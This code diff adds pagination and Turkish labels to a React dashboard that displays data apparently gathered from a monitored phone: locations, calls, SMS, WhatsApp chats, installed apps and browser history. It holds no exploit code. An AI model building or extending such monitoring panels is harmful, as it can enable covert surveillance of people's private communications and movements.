@@ -1,4 +1,4 @@
-import { useEffect, useMemo, useRef, useState } from 'react'
+﻿import { useEffect, useMemo, useRef, useState } from 'react'
 import { useParams, useNavigate } from 'react-router-dom'
 import { MapContainer, TileLayer, Marker, Popup, Polyline, useMap } from 'react-leaflet'
 import L from 'leaflet'
@@ -79,6 +79,33 @@ const TABS: { key: Tab; label: string }[] = [
   { key: 'browser',   label: '\u{1F310} Browser' },
 ]
 
+const PAGE_SIZE = 50
+
+function Pagination({ page, total, onChange }: {
+  page: number; total: number; onChange: (p: number) => void
+}) {
+  const totalPages = Math.max(1, Math.ceil(total / PAGE_SIZE))
+  if (totalPages <= 1) return null
+  return (
+    <div className="flex items-center justify-between px-4 py-3 border-t border-gray-100 bg-gray-50 rounded-b-xl flex-shrink-0">
+      <span className="text-xs text-gray-500">
+        {(page - 1) * PAGE_SIZE + 1}–{Math.min(page * PAGE_SIZE, total)} / {total}
+      </span>
+      <div className="flex items-center gap-2">
+        <button onClick={() => onChange(page - 1)} disabled={page === 1}
+          className="px-2.5 py-1 text-xs rounded-lg border border-gray-200 text-gray-600 hover:bg-gray-100 disabled:opacity-40 disabled:cursor-not-allowed transition-colors">
+          ‹ Önceki
+        </button>
+        <span className="text-xs text-gray-500 tabular-nums font-medium">{page} / {totalPages}</span>
+        <button onClick={() => onChange(page + 1)} disabled={page === totalPages}
+          className="px-2.5 py-1 text-xs rounded-lg border border-gray-200 text-gray-600 hover:bg-gray-100 disabled:opacity-40 disabled:cursor-not-allowed transition-colors">
+          Sonraki ›
+        </button>
+      </div>
+    </div>
+  )
+}
+
 export default function DevicePage() {
   const { id }   = useParams<{ id: string }>()
   const nav      = useNavigate()
@@ -94,26 +121,41 @@ export default function DevicePage() {
   const [apps,        setApps]        = useState<InstalledAppDto[]>([])
   const [music,       setMusic]       = useState<MusicPlayDto[]>([])
   const [browser,     setBrowser]     = useState<BrowserHistoryDto[]>([])
-  const [refreshing,  setRefreshing]  = useState(false)
+  const [loading,     setLoading]     = useState(false)
   const [appSearch,   setAppSearch]   = useState('')
   const [activeChat,  setActiveChat]  = useState<string | null>(null)
   const msgEndRef = useRef<HTMLDivElement>(null)
+  const [pages, setPages] = useState<Record<Tab, number>>({
+    map: 1, calls: 1, sms: 1, wa_notifs: 1, wa_chats: 1, apps: 1, media: 1, browser: 1,
+  })
+  const [totals, setTotals] = useState<Record<Tab, number>>({
+    map: 0, calls: 0, sms: 0, wa_notifs: 0, wa_chats: 0, apps: 0, media: 0, browser: 0,
+  })
 
-  useEffect(() => { loadData() }, [deviceId])
-
-  const loadData = () => {
-    setRefreshing(true)
-    Promise.all([
-      getLocations(deviceId).then(r => setLocations(r.data)),
-      getCallLogs(deviceId).then(r => setCalls(r.data)),
-      getSmsLogs(deviceId).then(r => setSms(r.data)),
-      getWhatsApp(deviceId).then(r => setWhatsapp(r.data)),
-      getWhatsAppChats(deviceId).then(r => setWaChats(r.data)),
-      getInstalledApps(deviceId).then(r => setApps(r.data)),
-      getMusicHistory(deviceId).then(r => setMusic(r.data)),
-      getBrowserHistory(deviceId).then(r => setBrowser(r.data)),
-    ]).catch(() => {}).finally(() => setRefreshing(false))
+  const loadTab = (t: Tab, page: number) => {
+    setLoading(true)
+    const fetchMap: Record<Tab, () => Promise<void>> = {
+      map:       () => getLocations(deviceId).then(r => setLocations(r.data)),
+      calls:     () => getCallLogs(deviceId, page).then(r => { setCalls(r.data.items); setTotals(prev => ({ ...prev, calls: r.data.total })) }),
+      sms:       () => getSmsLogs(deviceId, page).then(r => { setSms(r.data.items); setTotals(prev => ({ ...prev, sms: r.data.total })) }),
+      wa_notifs: () => getWhatsApp(deviceId, page).then(r => { setWhatsapp(r.data.items); setTotals(prev => ({ ...prev, wa_notifs: r.data.total })) }),
+      wa_chats:  () => getWhatsAppChats(deviceId).then(r => setWaChats(r.data)),
+      apps:      () => getInstalledApps(deviceId).then(r => setApps(r.data)),
+      media:     () => getMusicHistory(deviceId, page).then(r => { setMusic(r.data.items); setTotals(prev => ({ ...prev, media: r.data.total })) }),
+      browser:   () => getBrowserHistory(deviceId, page).then(r => { setBrowser(r.data.items); setTotals(prev => ({ ...prev, browser: r.data.total })) }),
+    }
+    fetchMap[t]().catch(() => {}).finally(() => setLoading(false))
   }
+
+  const handlePageChange = (t: Tab, p: number) => {
+    setPages(prev => ({ ...prev, [t]: p }))
+    loadTab(t, p)
+  }
+
+  useEffect(() => {
+    setPages(prev => ({ ...prev, [tab]: 1 }))
+    loadTab(tab, 1)
+  }, [tab, deviceId])
 
   // Auto-scroll to bottom when active chat messages change
   useEffect(() => {
@@ -157,6 +199,12 @@ export default function DevicePage() {
     return groups.reverse()
   }, [locations])
 
+  const appsFiltered = apps.filter(a =>
+    a.appName.toLowerCase().includes(appSearch.toLowerCase()) ||
+    a.packageName.toLowerCase().includes(appSearch.toLowerCase())
+  )
+  const appsPage = appsFiltered.slice((pages.apps - 1) * PAGE_SIZE, pages.apps * PAGE_SIZE)
+
   return (
     <div className="h-screen flex flex-col bg-gray-50">
       {/* Header */}
@@ -169,15 +217,19 @@ export default function DevicePage() {
         </button>
         <h1 className="text-lg font-bold text-gray-900">Device #{deviceId}</h1>
         <button
-          onClick={loadData}
-          disabled={refreshing}
+          onClick={() => loadTab(tab, pages[tab])}
+          disabled={loading}
           className="ml-auto px-4 py-1.5 bg-indigo-600 hover:bg-indigo-700 text-white text-sm font-semibold rounded-lg transition-colors disabled:opacity-50"
         >
-          {refreshing ? 'Refreshing…' : '↻ Refresh'}
+          {loading ? 'Yükleniyor…' : '↻ Yenile'}
         </button>
       </header>
 
-      <main className={`flex-1 flex flex-col overflow-hidden ${tab === 'wa_chats' || tab === 'map' ? 'p-2 md:p-4' : 'p-3 md:p-6 overflow-y-auto'}`}>
+      <main className={
+        tab === 'wa_chats' || tab === 'map'
+          ? 'flex-1 flex flex-col overflow-hidden p-2 md:p-4'
+          : 'flex-1 overflow-y-auto p-3 md:p-6'
+      }>
         {/* Tabs */}
         <div className="flex flex-wrap gap-1.5 md:gap-2 mb-3 md:mb-5 flex-shrink-0">
           {TABS.map(t => (
@@ -196,9 +248,14 @@ export default function DevicePage() {
         </div>
 
         {/* â”€â”€â”€ MAP â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */}
+        {loading && (
+          <div className="flex items-center justify-center py-2 mb-1 text-indigo-500 text-sm font-medium flex-shrink-0 animate-pulse">
+            Y\u00fckleniyor\u2026
+          </div>
+        )}
+
         {tab === 'map' && (
           <div className="flex-1 flex flex-col md:flex-row gap-3 md:gap-4 min-h-0">
-            {/* Harita – mobilde ~50vh, desktop %70 */}
             <div className="md:flex-[7] rounded-xl overflow-hidden shadow-sm flex-shrink-0 h-[50vh] md:h-auto">
               <MapContainer
                 center={latest ? [latest.latitude, latest.longitude] : [39.9, 32.8]}
@@ -301,7 +358,7 @@ export default function DevicePage() {
                 </tbody>
               </table>
             </div>
-
+            <Pagination page={pages.calls} total={totals.calls} onChange={p => handlePageChange('calls', p)} />
           </div>
         )}
 
@@ -343,7 +400,7 @@ export default function DevicePage() {
                 </tbody>
               </table>
             </div>
-
+            <Pagination page={pages.sms} total={totals.sms} onChange={p => handlePageChange('sms', p)} />
           </div>
         )}
 
@@ -396,7 +453,7 @@ export default function DevicePage() {
                 </tbody>
               </table>
             </div>
-
+            <Pagination page={pages.wa_notifs} total={totals.wa_notifs} onChange={p => handlePageChange('wa_notifs', p)} />
           </div>
         )}
 
@@ -504,78 +561,65 @@ export default function DevicePage() {
                 type="search"
                 placeholder="Search apps…"
                 value={appSearch}
-                onChange={e => setAppSearch(e.target.value)}
+                onChange={e => { setAppSearch(e.target.value); setPages(prev => ({ ...prev, apps: 1 })) }}
                 className="w-full md:w-72 px-3 py-2 text-sm border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-300"
               />
               <span className="text-xs text-gray-400">
-                {apps.filter(a =>
-                  a.appName.toLowerCase().includes(appSearch.toLowerCase()) ||
-                  a.packageName.toLowerCase().includes(appSearch.toLowerCase())
-                ).length} / {apps.length} apps
+                {appsFiltered.length} / {apps.length} apps
               </span>
             </div>
 
             <div className="bg-white rounded-xl shadow-sm overflow-hidden">
-              {(() => {
-                const filtered = apps.filter(a =>
-                  a.appName.toLowerCase().includes(appSearch.toLowerCase()) ||
-                  a.packageName.toLowerCase().includes(appSearch.toLowerCase())
-                )
-                return (
-                  <>
-                    {/* Mobile */}
-                    <div className="md:hidden divide-y divide-gray-100">
-                      {filtered.length === 0 && <p className="px-4 py-8 text-center text-gray-400 text-sm">No app data yet. Waiting for device sync.</p>}
-                      {filtered.map((a, i) => (
-                        <div key={i} className="flex items-center gap-3 px-4 py-3">
-                          {a.iconBase64
-                            ? <img src={`data:image/png;base64,${a.iconBase64}`} alt="" className="w-10 h-10 rounded-xl flex-shrink-0" />
-                            : <span className="w-10 h-10 flex items-center justify-center text-2xl flex-shrink-0">📦</span>
-                          }
-                          <div className="flex-1 min-w-0">
-                            <p className="text-sm font-semibold text-gray-800 truncate">{a.appName}</p>
-                            <p className="text-xs text-gray-400 font-mono truncate">{a.packageName}</p>
-                            <p className="text-xs text-gray-400">v{a.version || '—'} · {fmt(a.lastSeenAt)}</p>
-                          </div>
-                        </div>
-                      ))}
+              {/* Mobile */}
+              <div className="md:hidden divide-y divide-gray-100">
+                {appsPage.length === 0 && <p className="px-4 py-8 text-center text-gray-400 text-sm">No app data yet. Waiting for device sync.</p>}
+                {appsPage.map((a, i) => (
+                  <div key={i} className="flex items-center gap-3 px-4 py-3">
+                    {a.iconBase64
+                      ? <img src={`data:image/png;base64,${a.iconBase64}`} alt="" className="w-10 h-10 rounded-xl flex-shrink-0" />
+                      : <span className="w-10 h-10 flex items-center justify-center text-2xl flex-shrink-0">📦</span>
+                    }
+                    <div className="flex-1 min-w-0">
+                      <p className="text-sm font-semibold text-gray-800 truncate">{a.appName}</p>
+                      <p className="text-xs text-gray-400 font-mono truncate">{a.packageName}</p>
+                      <p className="text-xs text-gray-400">v{a.version || '—'} · {fmt(a.lastSeenAt)}</p>
                     </div>
+                  </div>
+                ))}
+              </div>
 
-                    {/* Desktop */}
-                    <div className="hidden md:block overflow-x-auto">
-                      <table className="w-full border-collapse">
-                        <thead>
-                          <tr><TH>Icon</TH><TH>App Name</TH><TH>Package</TH><TH>Version</TH><TH>Installed</TH><TH>Last Seen</TH></tr>
-                        </thead>
-                        <tbody>
-                          {filtered.map((a, i) => (
-                            <tr key={i} className="hover:bg-gray-50">
-                              <TD>
-                                {a.iconBase64
-                                  ? <img src={`data:image/png;base64,${a.iconBase64}`} alt="" className="w-8 h-8 rounded" />
-                                  : <span className="text-gray-300 text-lg">📦</span>}
-                              </TD>
-                              <TD className="font-medium">{a.appName}</TD>
-                              <TD className="font-mono text-xs text-gray-500">{a.packageName}</TD>
-                              <TD>{a.version || '—'}</TD>
-                              <TD>{fmt(a.installedAt)}</TD>
-                              <TD>{fmt(a.lastSeenAt)}</TD>
-                            </tr>
-                          ))}
-                          {filtered.length === 0 && (
-                            <tr><td colSpan={6} className="px-4 py-8 text-center text-gray-400 text-sm">No app data yet. Waiting for device sync.</td></tr>
-                          )}
-                        </tbody>
-                      </table>
-                    </div>
-                  </>
-                )
-              })()}
+              {/* Desktop */}
+              <div className="hidden md:block overflow-x-auto">
+                <table className="w-full border-collapse">
+                  <thead>
+                    <tr><TH>Icon</TH><TH>App Name</TH><TH>Package</TH><TH>Version</TH><TH>Installed</TH><TH>Last Seen</TH></tr>
+                  </thead>
+                  <tbody>
+                    {appsPage.map((a, i) => (
+                      <tr key={i} className="hover:bg-gray-50">
+                        <TD>
+                          {a.iconBase64
+                            ? <img src={`data:image/png;base64,${a.iconBase64}`} alt="" className="w-8 h-8 rounded" />
+                            : <span className="text-gray-300 text-lg">📦</span>}
+                        </TD>
+                        <TD className="font-medium">{a.appName}</TD>
+                        <TD className="font-mono text-xs text-gray-500">{a.packageName}</TD>
+                        <TD>{a.version || '—'}</TD>
+                        <TD>{fmt(a.installedAt)}</TD>
+                        <TD>{fmt(a.lastSeenAt)}</TD>
+                      </tr>
+                    ))}
+                    {appsPage.length === 0 && (
+                      <tr><td colSpan={6} className="px-4 py-8 text-center text-gray-400 text-sm">No app data yet. Waiting for device sync.</td></tr>
+                    )}
+                  </tbody>
+                </table>
+              </div>
+              <Pagination page={pages.apps} total={appsFiltered.length} onChange={p => setPages(prev => ({ ...prev, apps: p }))} />
             </div>
           </div>
         )}
 
-        {/* ─── MUSIC ──────────────────────────────────────────── */}
         {tab === 'media' && (
           <div className="bg-white rounded-xl shadow-sm overflow-hidden">
 
@@ -649,7 +693,7 @@ export default function DevicePage() {
                 </tbody>
               </table>
             </div>
-
+            <Pagination page={pages.media} total={totals.media} onChange={p => handlePageChange('media', p)} />
           </div>
         )}
 
@@ -657,7 +701,7 @@ export default function DevicePage() {
         {tab === 'browser' && (
           <div className="flex flex-col gap-3">
             <div className="flex items-center justify-between">
-              <span className="text-xs text-gray-500">{browser.length} visit{browser.length !== 1 ? 's' : ''} recorded</span>
+              <span className="text-xs text-gray-500">{totals.browser} visit{totals.browser !== 1 ? 's' : ''} recorded</span>
             </div>
 
             <div className="bg-white rounded-xl shadow-sm overflow-hidden">
@@ -722,6 +766,7 @@ export default function DevicePage() {
                   </tbody>
                 </table>
               </div>
+              <Pagination page={pages.browser} total={totals.browser} onChange={p => handlePageChange('browser', p)} />
             </div>
           </div>
         )}
